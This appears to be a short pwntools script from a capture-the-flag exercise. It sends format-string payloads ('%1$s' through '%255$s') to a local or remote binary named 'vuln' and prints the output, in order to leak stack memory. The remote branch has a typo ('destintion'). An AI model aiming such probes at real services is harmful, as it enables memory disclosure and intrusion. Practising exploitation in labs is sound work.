import pwn
import argparse

pwn.context.log_level = "critical"

parser = argparse.ArgumentParser()
parser.add_argument("destination", type=str, choices={"local", "remote"})
parser.add_argument("--target", "-t", type=str, default = "", required = False )
parser.add_argument("--port", "-p", type=str, default = 0, required = False )
args = parser.parse_args()

elf = pwn.ELF("./vuln")

offset = 64

for i in range(1,256):

    payload = b"".join(
        [
            b"%" + str(i).encode("utf-8") + b"$s",
        ]
    )

    if args.destination == "local":
        p = elf.process()
    elif args.destintion == "remote":
        if not args.target or not args.port:
            pwn.warning("supply target and port")
            exit()
        p = pwn.remote(args.target, args.port)

    p.recvuntil(b">> ")
    p.sendline(payload)
    response = p.recvall().decode("latin-1")
    print(response)